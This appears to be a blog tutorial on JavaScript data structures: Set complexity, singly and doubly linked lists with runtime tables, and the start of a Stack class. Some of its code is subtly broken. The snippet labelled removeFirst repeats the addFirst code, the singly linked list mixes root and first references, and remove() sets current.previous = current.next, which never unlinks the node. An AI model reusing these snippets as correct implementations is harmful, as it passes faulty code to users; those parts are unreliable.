<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> assert = <span class="built_in">require</span>(<span class="string">'assert'</span>);</span><br><span class="line"><span class="comment">// const set = new Set(); // Using the built-in</span></span><br><span class="line"><span class="keyword">const</span> set = <span class="keyword">new</span> MySet(); <span class="comment">// Using our own implementation</span></span><br><span class="line"></span><br><span class="line">set.add(<span class="string">'one'</span>);</span><br><span class="line">set.add(<span class="string">'uno'</span>);</span><br><span class="line">set.add(<span class="string">'one'</span>); <span class="comment">// should NOT add this one twice</span></span><br><span class="line"></span><br><span class="line">assert.equal(set.has(<span class="string">'one'</span>), <span class="literal">true</span>);</span><br><span class="line">assert.equal(set.has(<span class="string">'dos'</span>), <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">assert.equal(set.size, <span class="number">2</span>);</span><br><span class="line"><span class="comment">// assert.deepEqual(Array.from(set), ['one', 'uno']);</span></span><br><span class="line"></span><br><span class="line">assert.equal(set.delete(<span class="string">'one'</span>), <span class="literal">true</span>);</span><br><span class="line">assert.equal(set.delete(<span class="string">'one'</span>), <span class="literal">false</span>);</span><br><span class="line">assert.equal(set.has(<span class="string">'one'</span>), <span class="literal">false</span>);</span><br><span class="line">assert.equal(set.size, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<p>You should be able to use <code>MySet</code> and the built-in <code>Set</code> interchangeably for this examples.</p>
<h2 id="Set-Operations-runtime">Set Operations runtime<a href="#Set-Operations-runtime" class="headerlink" title="Set Operations runtime"></a></h2><p>From our Set implementation using a HashMap we can sum up the time complexity as follows (very similar to the HashMap):</p>
<p><strong>Set Time Complexities</strong></p>
<table>
<thead>
<tr>
<th>Operation</th>
<th>Worst</th>
<th>Amortized</th>
<th>Comments</th>
</tr>
</thead>
<tbody>
<tr>
<td>Access/Search (<code>Set.has</code>)</td>
<td><em><code>O(n)</code></em></td>
<td><em><code>O(1)</code></em></td>
<td><em><code>O(n)</code></em> is an extreme case when there are too many collisions</td>
</tr>
<tr>
<td>Insert/Edit (<code>Set.add</code>)</td>
<td><em><code>O(n)</code></em></td>
<td><em><code>O(1)</code></em></td>
<td><em><code>O(n)</code></em> only happens with <em>rehash</em> when the Hash is 0.75 full</td>
</tr>
<tr>
<td>Delete (<code>Set.delete</code>)</td>
<td><em><code>O(n)</code></em></td>
<td><em><code>O(1)</code></em></td>
<td><em><code>O(n)</code></em> is an extreme case when there are too many collisions</td>
</tr>
</tbody>
</table>
<h1 id="Linked-Lists">Linked Lists<a href="#Linked-Lists" class="headerlink" title="Linked Lists"></a></h1><p>Linked List is a data structure where every element is connected to the next one.</p>
<img src="/images/linked-list.jpg" title="LinkedList">
<p>The linked list is the first data structure that we are going to implement without using an array. Instead, we are going to use a <code>node</code> which holds a <code>value</code> and points to the next element.</p>
<figure class="highlight js"><figcaption><span>node.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(value) &#123;</span><br><span class="line">    <span class="keyword">this</span>.value = value;</span><br><span class="line">    <span class="keyword">this</span>.next = <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>When we have a chain of nodes where each one points to the next one we a <strong>Singly Linked list</strong>.</p>
<h2 id="Singly-Linked-Lists">Singly Linked Lists<a href="#Singly-Linked-Lists" class="headerlink" title="Singly Linked Lists"></a></h2><p>For a singly linked list, we only have to worry about every element having a reference to the next one.</p>
<p>We start by constructing the root or head element.</p>
<figure class="highlight js"><figcaption><span>linked-list.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LinkedList</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>() &#123;</span><br><span class="line">    <span class="keyword">this</span>.root = <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>There are 4 basic operations that we can do in every Linked List:</p>
<ol>
<li><code>addLast</code>: appends an element to the end of the list (tail)</li>
<li><code>removeLast</code>: deletes element to the end of the list</li>
<li><code>addFirst</code>: Adds an element to the beginning of the list (head)</li>
<li><code>removeFirst</code>: Removes an element from the start of the list (head/root)</li>
</ol>
<p><strong>Adding/Removing an element at the end of a linked list</strong></p>
<p>There are two primary cases. 1) If the list first (root/head) doesn‚Äôt have any element yet, we make this node the head of the list.
2) Contrary, if the list already has elements, then we have to iterate until finding the last one and appending our new node to the end.</p>
<p><a id="SinglyLinkedList.addLast"></a>
<figure class="highlight js"><figcaption><span>LinkedList.prototype.addLast</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">addLast(value) &#123; <span class="comment">// similar Array.push</span></span><br><span class="line">  <span class="keyword">const</span> node = <span class="keyword">new</span> Node(value);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">this</span>.root) &#123;</span><br><span class="line">    <span class="keyword">let</span> currentNode = <span class="keyword">this</span>.root;</span><br><span class="line">    <span class="keyword">while</span>(currentNode &amp;&amp; currentNode.next) &#123;</span><br><span class="line">      currentNode = currentNode.next;</span><br><span class="line">    &#125;</span><br><span class="line">    currentNode.next = node;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.root = node;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>What‚Äôs the runtime of this code? If it is the first element, then adding to the root is <em>O(1)</em>. However, finding the last element is <em>O(n)</em>.</p>
<p>Now, removing element an element from the end of the list has a similar code. We have to find the current before last and make its <code>next</code> reference <code>null</code>.</p>
<p><a id="SinglyLinkedList.removeLast"></a>
<figure class="highlight js"><figcaption><span>LinkedList.prototype.removeLast</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">removeLast() &#123;</span><br><span class="line">  <span class="keyword">let</span> current = <span class="keyword">this</span>.root;</span><br><span class="line">  <span class="keyword">let</span> target;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(current &amp;&amp; current.next) &#123;</span><br><span class="line">    <span class="keyword">while</span>(current &amp;&amp; current.next &amp;&amp; current.next.next) &#123;</span><br><span class="line">      current = current.next;</span><br><span class="line">    &#125;</span><br><span class="line">    target = current.next;</span><br><span class="line marked">    current.next = <span class="literal">null</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.root = <span class="literal">null</span>;</span><br><span class="line">    target = current;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(target) &#123;</span><br><span class="line">    <span class="keyword">return</span> target.value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>The runtime again is <em>O(n)</em> because we have to iterate until the second-last element and remove the reference to the last (line 10).</p>
<p><strong>Adding/Removing an element from the beginning of a linked list</strong></p>
<p><a id="SinglyLinkedList.removeFirst"></a></p>
<p>Adding an element to the head of the list is like this:</p>
<figure class="highlight js"><figcaption><span>LinkedList.addFirst</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">addFirst(value) &#123;</span><br><span class="line">  <span class="keyword">const</span> node = <span class="keyword">new</span> Node(value);</span><br><span class="line">  node.next = <span class="keyword">this</span>.first;</span><br><span class="line">  <span class="keyword">this</span>.first = node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Adding and removing elements from the beginning is a constant time because we hold a reference to the first element:</p>
<figure class="highlight js"><figcaption><span>LinkedList.removeFirst</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">addFirst(value) &#123;</span><br><span class="line">  <span class="keyword">const</span> node = <span class="keyword">new</span> Node(value);</span><br><span class="line">  node.next = <span class="keyword">this</span>.first;</span><br><span class="line">  <span class="keyword">this</span>.first = node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>As expected the runtime for removing/adding to the firt element from a linked List is always constant <em>O(1)</em></p>
<p><a id="LinkedList.remove"></a></p>
<p><strong>Removing an element anywhere from a linked list</strong></p>
<p>Removing an element anywhere in the list levarage the <code>removeLast</code> and <code>removeFirst</code>. However, if the removal is in the middle then we assign the previous node to the next one. That removes any reference from the current node, thus is removed from the list:</p>
<figure class="highlight js"><figcaption><span>LinkedList.remove</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">remove(index = <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(index === <span class="number">0</span>) &#123;</span><br><span class="line marked">    <span class="keyword">return</span> <span class="keyword">this</span>.removeFirst();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> current = <span class="keyword">this</span>.first, i = <span class="number">0</span>; current;  i++, current = current.next) &#123;</span><br><span class="line">    <span class="keyword">if</span>(i === index) &#123;</span><br><span class="line">      <span class="keyword">if</span>(!current.next) &#123; <span class="comment">// if it doesn't have next it means that it is the last</span></span><br><span class="line marked">        <span class="keyword">return</span> <span class="keyword">this</span>.removeLast();</span><br><span class="line">      &#125;</span><br><span class="line marked">      current.previous = current.next;</span><br><span class="line">      <span class="keyword">this</span>.size--;</span><br><span class="line">      <span class="keyword">return</span> current.value;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Note that <code>index</code> is a zero-based index: 0 will be the first element, 1 second and so on.</p>
<blockquote>
<p>Removing an element anywhere within the list is <em>O(n)</em>.</p>
</blockquote>
<p><a id="LinkedList.contains"></a></p>
<p><strong>Searching for an element in a linked list</strong></p>
<p>Searching an element on the linked list is very somewhat similar to <code>remove</code>:</p>
<figure class="highlight js"><figcaption><span>LinkedList.contains</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">contains(value) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> current = <span class="keyword">this</span>.first, index = <span class="number">0</span>; current;  index++, current = current.next) &#123;</span><br><span class="line">    <span class="keyword">if</span>(current.value === value) &#123;</span><br><span class="line">      <span class="keyword">return</span> index;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>This function finds the first element with given value.</p>
<blockquote>
<p>The runtime for seaching an element in a linked list is <em>O(n)</em></p>
</blockquote>
<h2 id="Singly-Linked-Lists-time-complexity">Singly Linked Lists time complexity<a href="#Singly-Linked-Lists-time-complexity" class="headerlink" title="Singly Linked Lists time complexity"></a></h2><p>Singly Linked List time complexity per function is as follows</p>
<table>
<thead>
<tr>
<th>Operation</th>
<th>Runtime</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="#DoublyLinkedList.addFirst"><code>addFirst</code></a></td>
<td><em>O(1)</em></td>
<td>Insert element to the beginning of the list</td>
</tr>
<tr>
<td><a href="#SinglyLinkedList.addLast"><code>addLast</code></a></td>
<td><em>O(n)</em></td>
<td>Insert element to the end of the list</td>
</tr>
<tr>
<td><a href="#DoublyLinkedList.add"><code>add</code></a></td>
<td><em>O(n)</em></td>
<td>Insert element anywhere in the list.</td>
</tr>
<tr>
<td><a href="#DoublyLinkedList.removeFirst"><code>removeFirst</code></a></td>
<td><em>O(1)</em></td>
<td>Remove element to the beginning of the list</td>
</tr>
<tr>
<td><a href="#SinglyLinkedList.removeLast"><code>removeLast</code></a></td>
<td><em>O(n)</em></td>
<td>Remove element to the end of the list</td>
</tr>
<tr>
<td><a href="#LinkedList.remove"><code>remove</code></a></td>
<td><em>O(n)</em></td>
<td>Remove any element from the list</td>
</tr>
<tr>
<td><a href="#LinkedList.contains"><code>contains</code></a></td>
<td><em>O(n)</em></td>
<td>Search for any element from the list</td>
</tr>
</tbody>
</table>
<p>Notice that every time we are adding/removing from the last position the operation takes <em>O(n)</em>‚Ä¶</p>
<blockquote>
<p>But we could reduce the <code>addLast</code>/<code>removeLast</code> from <em>O(n)</em> to a flat <em>O(1)</em> if we keep a reference of the last element!</p>
</blockquote>
<p>We are going to add the last reference in the next section!</p>
<h2 id="Doubly-Linked-Lists">Doubly Linked Lists<a href="#Doubly-Linked-Lists" class="headerlink" title="Doubly Linked Lists"></a></h2><p>When we have a chain of nodes where each one points to the next one we a <strong>Singly Linked list</strong>. When we have a linked list where each node leads to the <strong>next</strong> and the <strong>previous</strong> element we a <strong>Doubly Linked List</strong></p>
<img src="/images/doubly-linked-list.jpg" title="Doubly Linked List">
<p>Doubly linked list nodes have double references (next and previous). We are also going to keep track of the list first and the last element.</p>
<figure class="highlight js"><figcaption><span>Doubly Linked List</span><a href="https://github.com/amejiarosario/algorithms.js/blob/master/lib/data-structures/linked-lists/linked-list.js" target="_blank" rel="noopener">full code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(value) &#123;</span><br><span class="line">    <span class="keyword">this</span>.value = value;</span><br><span class="line">    <span class="keyword">this</span>.next = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">this</span>.previous = <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LinkedList</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>() &#123;</span><br><span class="line">    <span class="keyword">this</span>.first = <span class="literal">null</span>; <span class="comment">// head/root element</span></span><br><span class="line">    <span class="keyword">this</span>.last = <span class="literal">null</span>; <span class="comment">// last element of the list</span></span><br><span class="line">    <span class="keyword">this</span>.size = <span class="number">0</span>; <span class="comment">// total number of elements in the list</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Adding and Removing from the start of list</strong></p>
<p>Adding and removing from the start of the list is simple since we have <code>this.first</code> reference:</p>
<p><a id="DoublyLinkedList.addFirst"></a>
<figure class="highlight js"><figcaption><span>LinkedList.prototype.addFirst</span><a href="https://github.com/amejiarosario/algorithms.js/blob/master/lib/data-structures/linked-lists/linked-list.js" target="_blank" rel="noopener">full code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">addFirst(value) &#123;</span><br><span class="line">  <span class="keyword">const</span> node = <span class="keyword">new</span> Node(value);</span><br><span class="line"></span><br><span class="line">  node.next = <span class="keyword">this</span>.first;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">this</span>.first) &#123;</span><br><span class="line">    <span class="keyword">this</span>.first.previous = node;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.last = node;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">this</span>.first = node; <span class="comment">// update head</span></span><br><span class="line">  <span class="keyword">this</span>.size++;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>Notice, that we have to be very careful and update the previous, size and last.</p>
<p><a id="DoublyLinkedList.removeFirst"></a>
<figure class="highlight js"><figcaption><span>LinkedList.prototype.removeFirst</span><a href="https://github.com/amejiarosario/algorithms.js/blob/master/lib/data-structures/linked-lists/linked-list.js" target="_blank" rel="noopener">full code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">removeFirst() &#123;</span><br><span class="line">  <span class="keyword">const</span> first = <span class="keyword">this</span>.first;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(first) &#123;</span><br><span class="line">    <span class="keyword">this</span>.first = first.next;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>.first) &#123;</span><br><span class="line">      <span class="keyword">this</span>.first.previous = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.size--;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> first.value;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.last = <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>What‚Äôs the runtime?</p>
<blockquote>
<p>Adding and removing elements from a (singly/doubly) LinkedList has a constant runtime <em>O(1)</em></p>
</blockquote>
<p><strong>Adding and removing from the end of list</strong></p>
<p>Adding and removing <em>from the end</em> of the list is a little tricky. If you checked in the Singly Linked List, both operations took <em>O(n)</em> since we had to loop through the list to find the last element. Now, we have the <code>last</code> reference:</p>
<p><a id="DoublyLinkedList.addLast"></a>
<figure class="highlight js"><figcaption><span>LinkedList.prototype.addLast</span><a href="https://github.com/amejiarosario/algorithms.js/blob/master/lib/data-structures/linked-lists/linked-list.js" target="_blank" rel="noopener">full code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">addLast(value) &#123;</span><br><span class="line">  <span class="keyword">const</span> node = <span class="keyword">new</span> Node(value);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">this</span>.first) &#123;</span><br><span class="line">    <span class="keyword">let</span> currentNode = <span class="keyword">this</span>.first;</span><br><span class="line">    node.previous = <span class="keyword">this</span>.last;</span><br><span class="line marked">    <span class="keyword">this</span>.last.next = node;</span><br><span class="line">    <span class="keyword">this</span>.last = node;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.first = node;</span><br><span class="line">    <span class="keyword">this</span>.last = node;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">this</span>.size++;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>Again, we have to be very careful updating the references and handling special cases such as when there‚Äôs only one element.</p>
<p><a id="DoublyLinkedList.removeLast"></a>
<figure class="highlight js"><figcaption><span>LinkedList.prototype.removeLast</span><a href="https://github.com/amejiarosario/algorithms.js/blob/master/lib/data-structures/linked-lists/linked-list.js" target="_blank" rel="noopener">full code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">removeLast() &#123;</span><br><span class="line">  <span class="keyword">let</span> current = <span class="keyword">this</span>.first;</span><br><span class="line">  <span class="keyword">let</span> target;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(current &amp;&amp; current.next) &#123;</span><br><span class="line marked">    current = <span class="keyword">this</span>.last.previous;</span><br><span class="line">    <span class="keyword">this</span>.last = current;</span><br><span class="line">    target = current.next;</span><br><span class="line">    current.next = <span class="literal">null</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.first = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">this</span>.last = <span class="literal">null</span>;</span><br><span class="line">    target = current;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(target) &#123;</span><br><span class="line">    <span class="keyword">this</span>.size--;</span><br><span class="line">    <span class="keyword">return</span> target.value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>Using doubly linked list, we no longer have to iterate through the whole list to get the 2nd last elements. We can use directly <code>this.last.previous</code> and is <code>O(1)</code>.</p>
<p>Did you remember that for the Queue we had to use two arrays? Now, we can change that implementation an use a doubly linked list instead that has an <em>O(1)</em> for insert at the start and deleting at the end.</p>
<p><a id="DoublyLinkedList.add"></a></p>
<p><strong>Adding an element anywhere from a linked list</strong></p>
<p>Adding an element on anywhere on the list leverage our <code>addFirst</code> andd <code>addLast</code> functions as you can see below:</p>
<figure class="highlight js"><figcaption><span>LinkedList.add</span><a href="https://github.com/amejiarosario/algorithms.js/blob/master/lib/data-structures/linked-lists/linked-list.js" target="_blank" rel="noopener">FullCode</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">add(value, index = <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(index === <span class="number">0</span>) &#123;</span><br><span class="line marked">    <span class="keyword">return</span> <span class="keyword">this</span>.addFirst(value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> current = <span class="keyword">this</span>.first, i = <span class="number">0</span>; i &lt;= <span class="keyword">this</span>.size;  i++, current = (current &amp;&amp; current.next)) &#123;</span><br><span class="line">    <span class="keyword">if</span>(i === index) &#123;</span><br><span class="line">      <span class="keyword">if</span>(i === <span class="keyword">this</span>.size) &#123; <span class="comment">// if it doesn't have next it means that it is the last</span></span><br><span class="line marked">        <span class="keyword">return</span> <span class="keyword">this</span>.addLast(value);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">const</span> newNode = <span class="keyword">new</span> Node(value);</span><br><span class="line">      newNode.previous = current.previous;</span><br><span class="line">      newNode.next = current;</span><br><span class="line"></span><br><span class="line">      current.previous.next = newNode;</span><br><span class="line">      <span class="keyword">if</span>(current.next) &#123; current.next.previous = newNode; &#125;</span><br><span class="line">      <span class="keyword">this</span>.size++;</span><br><span class="line">      <span class="keyword">return</span> newNode;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>If we have a insertion in the middle of the array, then we have to update the <code>next</code> and <code>previous</code> reference of the surrounding elements.</p>
<blockquote>
<p>Adding an element anywhere within the list is <em>O(n)</em>.</p>
</blockquote>
<h2 id="Doubly-Linked-Lists-time-complexity">Doubly Linked Lists time complexity<a href="#Doubly-Linked-Lists-time-complexity" class="headerlink" title="Doubly Linked Lists time complexity"></a></h2><p>Doubly Linked List time complexity per function is as follows:</p>
<table>
<thead>
<tr>
<th>Operation</th>
<th>Runtime</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="#DoublyLinkedList.addFirst"><code>addFirst</code></a></td>
<td><em>O(1)</em></td>
<td>Insert element to the beginning of the list.</td>
</tr>
<tr>
<td><a href="#DoublyLinkedList.addLast"><code>addLast</code></a></td>
<td><em>O(1)</em></td>
<td>Insert element to the end of the list.</td>
</tr>
<tr>
<td><a href="#DoublyLinkedList.add"><code>add</code></a></td>
<td><em>O(n)</em></td>
<td>Insert element anywhere in the list.</td>
</tr>
<tr>
<td><a href="#DoublyLinkedList.removeFirst"><code>removeFirst</code></a></td>
<td><em>O(1)</em></td>
<td>Remove element to the beginning of the list.</td>
</tr>
<tr>
<td><a href="#DoublyLinkedList.removeLast"><code>removeLast</code></a></td>
<td><em>O(1)</em></td>
<td>Remove element to the end of the list.</td>
</tr>
<tr>
<td><a href="#LinkedList.remove"><code>remove</code></a></td>
<td><em>O(n)</em></td>
<td>Remove any element from the list</td>
</tr>
<tr>
<td><a href="#LinkedList.contains"><code>contains</code></a></td>
<td><em>O(n)</em></td>
<td>Search for any element from the list</td>
</tr>
</tbody>
</table>
<p>This is a great improvement compared to the singly linked list! We improved from <em>O(n)</em> to <em>O(1)</em> by:</p>
<ul>
<li>Adding a reference the previous element.</li>
<li>Holding a reference to the last element in the list.</li>
</ul>
<p>Removing first/last can be done in constant-time, however removing in the middle of the array is still <em>O(n)</em>.</p>
<h1 id="Stacks">Stacks<a href="#Stacks" class="headerlink" title="Stacks"></a></h1><!-- https://docs.oracle.com/javase/10/docs/api/java/util/Stack.html -->
<p>Stacks is a data structure where the last entered data is the first to come out. Also know as Last-in, First-out (LIFO).</p>
<img src="/images/stack.jpg" title="Stack: push and pop">
<p>Let‚Äôs implement a stack from scratch!</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stack</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>() &#123;</span><br><span class="line">    <span class="keyword">this</span>.input = [];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  push(element) &#123;</span><br><span class="line">    <span class="keyword">this</span>.input.push(element);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  pop() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.input.pop();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
